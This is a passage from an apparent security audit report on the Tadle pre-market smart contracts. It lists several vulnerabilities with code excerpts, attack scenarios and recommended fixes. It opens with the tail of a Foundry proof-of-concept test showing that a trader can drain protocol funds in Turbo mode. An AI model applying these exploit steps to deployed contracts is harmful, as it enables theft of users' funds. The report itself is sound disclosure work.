        // Given the unrealistic listing price, there were no takers and bob's points were not used. He will settle 0 points
        // and $200_000 will be available for withdraw
        deliveryPlace.settleAskMaker(bobOfferAddr, 0);

        uint balanceBeforeWithdrawing = mockUSDCToken.balanceOf(address(user2));
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue);
        uint balanceAfterWithdrawing = mockUSDCToken.balanceOf(address(user2));

        // Bob got refunded with `200_000 USDC` that the protocol *thinks* he deposited
        assert(balanceAfterWithdrawing >= balanceBeforeWithdrawing + 200_000 ether);
    }
```
```bash
forge test --mt test_tradersCanStealFundsIfSubsequentListingsAreVirginInTurboMode

[PASS] test_tradersCanStealFundsIfSubsequentListingsAreVirginInTurboMode() (gas: 1286942)
```
## Impact
Malicious traders can exploit Turbo mode to drain the protocol's funds by listing offers with extremely high amounts and settling without any actual takers, leading to a significant loss of funds.
## Tools Used
Manual Review

## Recommendations
The current implementation incorrectly refunds the collateral in Turbo mode in which no collateral was deposited. 
Refunding collateral if there were no takers should be in either cases:
1. The original offer
2. Subsequent offer with `Protected` mode since they already deposited the collateral to be refunded.

Update the `settleAskmaker` function as follows
```diff
function settleAskMaker(address _offer, uint256 _settledPoints) external {
        // ...
     uint256 makerRefundAmount;
-    if (_settledPoints == offerInfo.usedPoints) {
+    if (_settledPoints == offerInfo.usedPoints && 
+    (makerInfo.offerType == OfferType.Protected || makerInfo.originOffer == _offer))
        if (offerInfo.offerStatus == OfferStatus.Virgin) { 
        // if there were no sub offers, refund the whole amount
            makerRefundAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
                offerInfo.collateralRate,
                offerInfo.amount,
                true,
                Math.Rounding.Floor
            );
        } else {//...}

        tokenManager.addTokenBalance(
            TokenBalanceType.SalesRevenue,
            _msgSender(),
            makerInfo.tokenAddress, 
            makerRefundAmount
        );
    }

    // ...
}
```

# H-07 Full collateral liquidation for bid-offer takers settling partial points

## Vulnerability Details
Bid-offer takers are required to deposit collateral equal to the amount they are selling to bid-offer makers, as demonstrated by the [createTaker](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L212-L234) function. After the TGE, bid-offer takers must settle the points they sold to offer makers by calling `settleBidTaker`. However, if a taker settles only partial points, the current implementation results in the offer maker receiving both the settled points tokens and the entirety of the taker’s collateral:
```solidity
function settleAskTaker(address _stock, uint256 _settledPoints) external {
    // ...
    uint256 settledPointTokenAmount = marketPlaceInfo.tokenPerPoint *
            _settledPoints;
     ITokenManager tokenManager = tadleFactory.getTokenManager();
    if (settledPointTokenAmount > 0) {
        tokenManager.tillIn(
            _msgSender(),
            marketPlaceInfo.tokenAddress,
            settledPointTokenAmount,
            true
        );
        tokenManager.addTokenBalance(
            TokenBalanceType.PointToken,
            offerInfo.authority,
            makerInfo.tokenAddress, 
            settledPointTokenAmount
        );
    }

    uint256 collateralFee = OfferLibraries.getDepositAmount(
        offerInfo.offerType,
        offerInfo.collateralRate,
        stockInfo.amount,
        false,
        Math.Rounding.Floor
    );

    if (_settledPoints == stockInfo.points) {
        tokenManager.addTokenBalance(
            TokenBalanceType.RemainingCash,
            _msgSender(),
            makerInfo.tokenAddress,
            collateralFee
        );
    } else {
        tokenManager.addTokenBalance(
            TokenBalanceType.MakerRefund,
            offerInfo.authority,
            makerInfo.tokenAddress,
            collateralFee
        );
    }
}
```

In the code above, the offer maker receives all the settled point tokens:

```solidity
if (settledPointTokenAmount > 0) {
    tokenManager.tillIn(
        _msgSender(),
        marketPlaceInfo.tokenAddress,
        settledPointTokenAmount,
        true
    );
    tokenManager.addTokenBalance(
        TokenBalanceType.PointToken,
        offerInfo.authority,
        makerInfo.tokenAddress, 
        settledPointTokenAmount
    );
}
```

Additionally, if the taker does not settle all of their points, the offer maker also receives the entire collateral deposited by the taker:

```solidity
if (_settledPoints == stockInfo.points) {// ...}
else {
    tokenManager.addTokenBalance(
        TokenBalanceType.MakerRefund,
        offerInfo.authority,
        makerInfo.tokenAddress,
        collateralFee
    );
}
```

This approach is unfair to the taker. Since the offer maker receives all the settled point tokens, **they should only receive the portion of the collateral corresponding to the unsettled points**. The taker should be refunded the collateral corresponding to the points they successfully settled.
## Proof Of Concept
Consider the following example:
1. As the Original Offer Maker, Alice posts a buy offer for `1,000` points with a unit price of $1 with 100% collateral parameter
2. Bob accepts Alice's buy offer and sells `1,000` points to her, depositing `$1,000` as collateral by calling [createTaker](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L212-L234)
3. The market owner updates the market and sets the TGE, initiating the settlement period.
4. For whatever reason, Bob is only able to settle `500` points by calling `settleAskTaker`
    4.1 Alice [receives all the settled point tokens](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L384-L390). `500` of the 1,000 points are settled.
    
    4.2 Since Bob couldn't settle all his points, Alice [incorrectly receives the entire $1,000 collateral](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L412) deposited by Bob, instead of just the portion corresponding to the unsettled points (`$500`).

Bob has settled 500 points but cannot withdraw the collateral corresponding to those settled points.

## Impact
Bid-offer takers who settle only partial points will lose their full collateral, even though they have successfully settled part of their offer.

## Tools Used
Manual Review

## Recommendations
Consider refunding bid-offer makers only the portion of collateral corresponding to the unsettled points. Below is a suggested code update:
```diff
function settleAskTaker(address _stock, uint256 _settledPoints) external {
    // ...

    if (_settledPoints == stockInfo.points) {
    // ...

    }else {
+    uint256 refundAmount = Math.mulDiv(
+        stockInfo.points - _settledPoints,
+        offerInfo.amount,
+        offerInfo.points,
+        Math.Rounding.Ceil
+    );
        tokenManager.addTokenBalance(
            TokenBalanceType.MakerRefund,
            offerInfo.authority,
            makerInfo.tokenAddress,
-           collateralFee
+           refundAmount
        );

+    tokenManager.addTokenBalance(
+        TokenBalanceType.MakerRefund,
+        _msgSender(),
+        makerInfo.tokenAddress,
+        collateralFee - refundAmount
+    );
        
    }
    // ...
}
```


## Vulnerability Details
All the core contracts located inside `core/*` directory are designed as upgradeable contracts. However, the implementation contracts incorrectly initialize their administrative states within their constructors.

For example, consider the `TokenManager` contract:
```solidity
contract TokenManager is
    TokenManagerStorage,
    Rescuable, 
    Related,
    ITokenManager
{
>>>    constructor() Rescuable() {}

    // ...

    function initialize(address _wrappedNativeToken) external onlyOwner {
        wrappedNativeToken = _wrappedNativeToken;
    }
}
```
The `Rescuable` contract, which is inherited by `TokenManager`, contains administrative states (such as `Ownable` and `Pausable`). The issue arises because `TokenManager` initializes these states within its constructor. This is problematic because, in an upgradeable contract architecture, all executions occur within the context of the Proxy contract. Therefore, all states should be initialized in the Proxy's storage via an `initialize` function, called through a delegate call.

This issue becomes will arise after upgrading contracts because the intended new owner (set in the implementation contract's storage during deployment) will not be correctly set in the Proxy's storage.
## Impact
When upgrading implementation contracts, new administrative states (such as ownership) will not be correctly initialized.
## Tools Used
Manual Review

## Recommendations
Consider initializing implementation states within the `initialize` function, or use `OwnableUpgradeable` and `PausableUpgradeable` extensions, which are specifically designed for upgradeable contracts.

# L-01 High risk of griefing attack during settlement period in Protected mode

## Summary
In Protected Mode, higher-ranked traders in the settlement process can delay their point settlements until the end of the settlement period, preventing subsequent traders from settling their points, and leading to forced collateral liquidation that cascades down the trading sequence, causing financial loss to subsequent traders.

## Vulnerability Details
In Protected Mode, all sellers, whether they are the original or subsequent ones, are required to deposit crypto as collateral. Upon settlement, **each seller must transfer tokens to the buyer according to the trading sequence**, as [outlined in the documentation](https://tadle.gitbook.io/tadle/how-tadle-works/mechanics-of-tadle/protected-mode). Ask-offer settlements occur within a specified [windowed period](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/libraries/MarketPlaceLibraries.sol#L41-L43) before bidding settlements starts; when the market status is `AskSettling`. 

The issue is that malicious ask-offers higher up in the trading sequence can delay their point settlements until the very end of the settlement period, potentially by front-running `updateMarket` transactions when the owner sets the TGE event. As a result, traders in the middle of the sequence, who still need to settle points with subsequent traders, may not receive the necessary points in time. This delay prevents them from settling within the designated settlement period, forcing the owner to call `settleAskTaker` to [forcefully settle their offers](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/core/DeliveryPlace.sol#L262-L263) and subsequent traders trigger the liquidation of collateral through the `closeBidTaker` function to get refunded with the token points they did not receive:
```solidity
function closeBidTaker(address _stock) external {
    //...
    (
        OfferInfo memory preOfferInfo,
        MakerInfo memory makerInfo,
        ,

    ) = getOfferInfo(stockInfo.preOffer);

    OfferInfo memory offerInfo;
    uint256 userRemainingPoints;
        
    if (makerInfo.offerSettleType == OfferSettleType.Protected) {
        offerInfo = preOfferInfo;
        userRemainingPoints = stockInfo.points;     
    }else {// ...} 

    // ...
    uint256 collateralFee;
    if (offerInfo.usedPoints > offerInfo.settledPoints) {
        if (offerInfo.offerStatus == OfferStatus.Virgin) {// ...
        } else {
            uint256 usedAmount = offerInfo.amount.mulDiv(
                offerInfo.usedPoints,
                offerInfo.points,
                Math.Rounding.Floor
            );

            collateralFee = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
                offerInfo.collateralRate,
                usedAmount,
                true,
                Math.Rounding.Floor
            );
        }
    }
    uint256 userCollateralFee = collateralFee.mulDiv(
        userRemainingPoints,
        offerInfo.usedPoints, 
        Math.Rounding.Floor
    );

    tokenManager.addTokenBalance(
        TokenBalanceType.RemainingCash,
        _msgSender(),
        makerInfo.tokenAddress,
        userCollateralFee
    );

    // ...
}
```
As seen above, in the  `Protected` Mode, if ask-offers do not settle their points, their collateral will be liquidated and distributed to the offer takers.

This liquidation can cascade down the trading sequence, as subsequent traders who are unable to settle their points will also have their collateral liquidated.

## Proof Of Concept
Consider the following example:
1. **Alice**, the initial market maker, lists `1,000` points for sale at $1 per unit and deposits $1,000 as collateral, **with `Protected` mode
2. **Bob** buys 500 points from **Alice** for $500. This amount is credited to Alice's balance and is available for withdrawal.
3. **Bob**, now a maker, lists the `500` points he purchased at a price of $1.10 per point and deposits $550 as collateral.
4. **Dany** buys `500` points from **Bob** at $1.10 per unit, paying $550. This amount is credited to Bob's balance and is available for withdrawal.

As the owner updates the market and sets the TGE, the market enters the AskSettling period:
1. **Alice** delays settling her points to **Bob** until the very end of the settling period.
    - Notice that **Bob** cannot settle his points to **Dany** until he receives them from Alice.
2. **Bob** eventually receives the token points from Alice's settlement but cannot settle them to **Dany** because the settlement period has ended, and the market has now entered the `BidSettling` phase. 
3. The owner will [call `settleAskMaker`](https://github.com/tadle-com/market-evm/blob/bbb19276f709841d19f299c18f529d09c151c00a/src/core/DeliveryPlace.sol#L262-L263) to forcefully settle Bob's offer.
4. Since **Dany** did not receive the token points from **Bob**, she calls `closeBidTaker` to claim a refund from Bob's collateral.

Notice that if **Dany** herself has points to settle to subsequent traders, the liquidation will continue cascading down through the trading sequence.

## Impact
Malicious traders in the trading sequence can delay settling their points until the very end of the settlement period, preventing subsequent traders from settling their points. This leads to the liquidation of collateral for those traders, allowing the malicious traders to cause cascading collateral liquidation.

## Tools Used
Manual Review

## Recommendations
The root cause of this issue is that settlements must occur according to the trading sequence, which is essential in Protected Mode. To mitigate this risk, one solution could be to implement a settlement period for each trader in the trading sequence. This approach would prevent griefing attacks by ensuring that each trader has an appropriate window to settle their points.

# L-02 Several functions will break if missing Virgin status update in `createTaker` is addressed

## Vulnerability Details
> **PRE CONTEXTE**: This issue arises after addressing the missing update of the `Ongoing` status when someone take an offer

The current implementation of `createTaker` does not update the offer status from `Virgin` to `Ongoing` (as explained in other report), after addressing that issue, several functions in the protocols will break and will not work as intended:

1. The `PreMarkets::abortAskOffer` function allows ask-offer owners to abort their offers and reclaim their collateral, while simultaneously aborting all ongoing deals with existing takers. Aborting an ask offer should be allowed under the following conditions:

    1. **Virgin Status**: The offer has no takers, allowing the owner to be refunded the full collateral
    2. **Canceled Status**: The offer has takers but was subsequently canceled. The owner can still abort the used points.
    3. **Ongoing Status**: The offer has active takers, and the owner aborts the offer. All existing takers are aborted, and the owner is refunded with his collateral(if there are no sub-trades in case of Turbo mode).

    The issue is that the third scenario (`Ongoing` status) is not included in the status check, [preventing the abortion](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L559-L564) of ask offers with an `Ongoing` status:
    ```solidity
    function abortAskOffer(address _stock, address _offer) external {
        // ...
        if (
            offerInfo.offerStatus != OfferStatus.Virgin &&
            offerInfo.offerStatus != OfferStatus.Canceled // @audit `Ongoing` status is not allowed
        ) {
            revert InvalidOfferStatus();
        }
        // ...
    }
    ```
2. **Bid** offer makers [deposit the amount](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L85-L101) of points they are willing to purchase in advance when creating an offer using the `createOffer` function in `PreMarket`. Sellers (bid takers) then call `createTaker` to sell points to bid offer makers when the market is online.

    During the settlement period, bid offer makers are expected to use the `DeliveryPlace::closeBidOffer` function to withdraw the collateral for the **unused points**—*those points that were not bought*. However, the function currently only allows refunds for offers that remain in the `Virgin` status:
    ```solidity
    function closeBidOffer(address _offer) external {
        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            ,
            MarketPlaceStatus status
        ) = getOfferInfo(_offer);

        if (_msgSender() != offerInfo.authority) {
            revert Errors.Unauthorized();
        }

        if (offerInfo.offerType == OfferType.Ask) {
            revert InvalidOfferType(OfferType.Bid, OfferType.Ask);
        }

        if (
            status != MarketPlaceStatus.AskSettling &&
            status != MarketPlaceStatus.BidSettling
        ) {
            revert InvaildMarketPlaceStatus();
        }

    >>>    if (offerInfo.offerStatus != OfferStatus.Virgin) { // @audit
            revert InvalidOfferStatus();
        }

        // ...
    }
    ```
    As seen above, the check `if (offerInfo.offerStatus != OfferStatus.Virgin) revert InvalidOfferStatus()` restricts refunds to offers that have not been traded (i.e., Virgin status). If an offer’s points were partially used—*meaning a bid taker sold some, but not all, of the offer points*—and the market enters the settlement period, **bid makers will be unable to retrieve the deposit for the unused points, causing these funds to remain stuck in the contract**.

3. Ask offer settlements should be initiated by the offer maker under one of the following conditions:
    1. `Virgin` Status: The offer has not been traded (no takers), allowing the offer maker to settle 0 points and receive their full collateral, as demonstrated by [this code block](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L275-L284) in `settleAskMaker`
    2. `Closed` Status: The offer was canceled, but some points were used before cancellation, which still need to be settled.
    3. `Ongoing` Status: The offer has takers, and offer points need to settled.

    The problem lies in the fact that the third scenario (`Ongoing` status) is not included in the status check, preventing the settlement of ask offers with an `Ongoing` status:
    ```solidity
    function settleAskMaker(address _offer, uint256 _settledPoints) external {
        // ...
        if (
            offerInfo.offerStatus != OfferStatus.Virgin &&
            offerInfo.offerStatus != OfferStatus.Canceled
        ) {
            revert InvalidOfferStatus();
        }
        // ...
    }
    ```

4. The `PreMarkets::closeOffer` function allows offer owners to cancel their offers and receive a refund based on the unused points amount, calculated by [getRefundAmount](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/libraries/OfferLibraries.sol#L63-L88). Cancellation of an offer should be permissible in one of the following scenarios (as confirmed by the sponsor):
    1. **Virgin Status**: The offer has no takers, and the owner is refunded the full collateral.
    2. **Ongoing Status**: The offer has takers, and the owner is refunded with the unused points.

    The problem is that the `closeOffer` function currently restricts cancellations to offers with a `Virgin` status only:
    ```solidity
    function closeOffer(address _stock, address _offer) external {
        OfferInfo storage offerInfo = offerInfoMap[_offer];
        StockInfo storage stockInfo = stockInfoMap[_stock];

        if (stockInfo.offer != _offer) {
            revert InvalidOfferAccount(stockInfo.offer, _offer);
        }

        if (offerInfo.authority != _msgSender()) {
            revert Errors.Unauthorized();
        }

    >>>   if (offerInfo.offerStatus != OfferStatus.Virgin) { 
            revert InvalidOfferStatus();
        }

        // ...
    }
    ```
    As shown above, the function enforces that the offer must have a `Virgin` status (no takers) for it to be canceled, but it does not allow the cancellation of offers with an `Ongoing` status, preventing the owner from canceling the offer and receiving a refund for the unused points.
## Impact
Several functions will break if the missing Virgin status update in `createTaker` is addressed
## Tools Used
Manual Review

## Recommendations
After addressing the missing update of offer status from `Virgin` to `Ongoing` in `createTaker`, consider iterating over the mentioned functions above and include the status `Ongoing` in the offer's status check
